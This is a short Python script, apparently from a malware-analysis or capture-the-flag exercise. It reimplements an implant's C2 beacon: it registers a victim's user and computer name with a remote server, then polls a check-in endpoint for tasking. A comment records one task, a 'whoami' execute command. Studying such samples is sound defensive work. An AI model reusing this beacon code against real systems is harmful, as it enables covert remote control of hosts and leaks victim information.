#!/usr/bin/python3

import requests
import sys
import time

SERVER = "exam.gradescopech0nky.com"
PORT = 443
USER_AGENT = "1337ch0nky"
GUID = "4F8E09B3-8C22-4C4B-9FC7-2ABD2B10144A"
CHECKIN = '/checkin.php'


def c2_connect(c2_post_file: str, c2_post_data_str: str):
    
    headers = {
        "User-Agent": USER_AGENT,
        "Authorization": GUID,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    url = f"https://{SERVER}:{PORT}{c2_post_file}"
    response = requests.post(url, headers=headers, data=c2_post_data_str)

    if response.status_code == 200:
        print("POST request successful!")
        print("Response:")
        print(response.text)
        return response.text
    else:
        print(f"POST request failed with status code {response.status_code}")

def c2_connect_with_rety():
    resp_txt = c2_connect(CHECKIN, 'desktop-mi7i96t\\vagrant')
    last_cmd = '877e34f81832b37ba27d66f93abaf1f66359742df6d2cdceb7073620b7'
    
    while resp_txt != last_cmd:
        print("Received same, trying again in a minute ...")
        time.sleep(60)
        resp_txt = c2_connect(CHECKIN, 'desktop-mi7i96t\\vagrant')

        if resp_txt is None:
            print("Request failed...")
            
    print("Response:")
    print(resp_txt)

"""
make_connections(
    some handle,
    user_agent, 
    server_name,
    port_num,
    post_verb,
    reg_php_fn,
    \x01,
    \x01,
    auth_str,
    guid ...? 
)
"""
auth_str = "auth=1337ch0nky&guid=4F8E09B3-8C22-4C4B-9FC7-2ABD2B10144A&user=vagrant&computer=DESKTOP-MI7I96T"
#c2_connect('/register.php', auth_str)

#c2_connect(CHECKIN, "")
""" Response
877e34f81832b37ba27d66f93abaf1f66359742df6d2cdceb7073620b7
'execute<ch0nky>whoami<ch0nky>'
"""
#c2_connect(CHECKIN, 'desktop-mi7i96t\\vagrant')
# same response
c2_connect_with_rety()
